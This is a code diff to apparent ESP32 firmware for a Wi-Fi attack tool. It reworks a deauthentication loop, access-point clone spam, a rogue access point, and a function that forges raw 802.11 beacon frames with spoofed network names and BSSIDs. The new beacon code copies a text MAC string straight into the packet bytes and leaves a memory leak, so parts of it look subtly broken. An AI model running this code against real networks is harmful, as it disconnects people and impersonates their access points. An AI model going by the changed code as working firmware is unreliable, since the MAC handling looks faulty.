@@ -37,7 +37,7 @@ public:
 			esp_wifi_set_mode(WIFI_MODE_APSTA);
 			// esp_wifi_set_mode(WIFI_MODE_AP);
 			esp_wifi_set_config(WIFI_IF_AP, &ap_config);
-			esp_wifi_get_mac(WIFI_IF_AP, original_mac_ap);
+			// esp_wifi_get_mac(WIFI_IF_AP, original_mac_ap);
 			esp_wifi_start();
 			esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
 			esp_wifi_set_promiscuous(true);
@@ -53,7 +53,7 @@ public:
 			WiFi.disconnect();
 			WiFi.mode(WIFI_OFF);
 			esp_wifi_disconnect();
-			esp_wifi_set_mac(WIFI_IF_AP, original_mac_ap);
+			// esp_wifi_set_mac(WIFI_IF_AP, original_mac_ap);
 			esp_wifi_set_mode(WIFI_MODE_NULL);
 			esp_wifi_set_promiscuous(false);
 			esp_wifi_set_max_tx_power(0);
@@ -67,16 +67,16 @@ public:
 	}
 
 	void deauthLoop() {
+		if (!updateScanAp()) {
+			l.log(Logger::ERROR, "Failed to scan nearby AP to deauth");
+			return;
+		}
+
 		loop_deauth_ap = !loop_deauth_ap;
 		l.log(Logger::INFO, loop_deauth_ap ? "Starting deauth loop" : "Stopping deauth loop");
 	
 		if (!loop_spam_ap)
 			return led.flash(2);
-
-		if (!updateScanAp()) {
-			l.log(Logger::ERROR, "Failed to scan nearby AP to deauth");
-			return;
-		}
 
 		// esp_wifi_set_mode(WIFI_MODE_AP);
 		led.flash();
@@ -95,6 +95,11 @@ public:
 	}
 
 	void cloneAPLoop() {
+		if (!updateScanAp()) {
+			l.log(Logger::ERROR, "Failed to scan nearby AP to deauth");
+			return;
+		}
+
 		loop_clone_spam_ap = !loop_clone_spam_ap;
 
 		l.log(Logger::INFO, loop_clone_spam_ap ? "Starting access point clone spam loop" : "Stopping access point clone spam loop");
@@ -102,17 +107,17 @@ public:
 		if (!loop_clone_spam_ap)
 			return led.flash(2);
 
-		if (!updateScanAp()) {
-			l.log(Logger::ERROR, "Failed to scan nearby AP to deauth");
-			return;
-		}
-
 		// esp_wifi_set_mode(WIFI_MODE_APSTA);
 		led.flash();
 
 	}
 
 	void rogueAPloop() {
+		if (!updateScanAp()) {
+			l.log(Logger::ERROR, "Failed to scan nearby AP to deauth");
+			return;
+		}
+
 		loop_rogue_ap = !loop_rogue_ap;
 
 		l.log(Logger::INFO, loop_rogue_ap ? "Starting access point rogue attack loop" : "Stopping access point rogue attack loop");
@@ -120,18 +125,12 @@ public:
 		if (!loop_rogue_ap)
 			return led.flash(2);
 
-		if (!updateScanAp()) {
-			l.log(Logger::ERROR, "Failed to scan nearby AP to deauth");
-			return;
-		}
-
-		esp_wifi_set_mode(WIFI_MODE_AP);
+		// esp_wifi_set_mode(WIFI_MODE_AP);
 		led.flash();
 	}
 
 	void scanNetworks()
 	{
-
 		led.flash();		
 
 		if (!updateScanAp()) {
@@ -232,7 +231,6 @@ private:
 	bool loop_deauth_ap = false;
 	int last_update = 0;
 
-
 	void switchChannel() {
 		current_channel++;
 
@@ -275,7 +273,7 @@ private:
 		return numNetworks != 0;
 	}
 
-	void beacon(String ssid, String bssid = "") {
+	void beacon(String ssid, String bssid) {
 		int ssidLen = ssid.length();
 
 		if (ssidLen > 32)
@@ -283,16 +281,48 @@ private:
 
 		switchChannel();
 
-		uint8_t* mac;
+		// uint8_t mac[6];
+		// sscanf(bssid.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
 		
-		// Check if custom BSSID is provided, otherwise generate a random one
-		if (bssid.length() > 0) {
-			mac = new uint8_t[6];
-        	sscanf(bssid.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
-		} else {
-			mac = utilities::rand_mac();
-		}
+		// Create a buffer for the packet
+		uint8_t buffer[beacon_packet_size];
+		// Copy the packet to the buffer
+		memcpy(buffer, beacon_packet, beacon_packet_size);
 
+		// Write the MAC address to the packet
+		const char* bssid_c = bssid.c_str();
+		memcpy(&buffer[10], bssid_c, 6);
+		memcpy(&buffer[16], bssid_c, 6);
+
+		// Write the SSID to the packet
+		const char* ssid_c = ssid.c_str();
+		memcpy(&buffer[38], ssid_c, ssidLen);
+
+		// Write the channel to the packet
+		buffer[82] = current_channel;
+		// Write the RSN information to the packet
+		buffer[34] = 0x31; // wpa2
+
+		// delete[] mac;
+
+		printBuffer(buffer, beacon_packet_size);
+
+		for (int i = 0; i < 3; i++) {
+			esp_wifi_80211_tx(WIFI_IF_STA, buffer, beacon_packet_size, 0);
+			delay(1);
+		}
+	}
+
+	void beacon(String ssid) {
+		int ssidLen = ssid.length();
+
+		if (ssidLen > 32)
+			return;
+
+		switchChannel();
+
+		uint8_t* mac = utilities::rand_mac();
+		
 		// Create a buffer for the packet
 		uint8_t buffer[beacon_packet_size];
 		// Copy the packet to the buffer
@@ -311,7 +341,7 @@ private:
 		// Write the RSN information to the packet
 		buffer[34] = 0x31; // wpa2
 
-		delete[] mac;
+		// delete[] mac;
 
 		for (int i = 0; i < 3; i++) {
 			esp_wifi_80211_tx(WIFI_IF_STA, buffer, beacon_packet_size, 0);
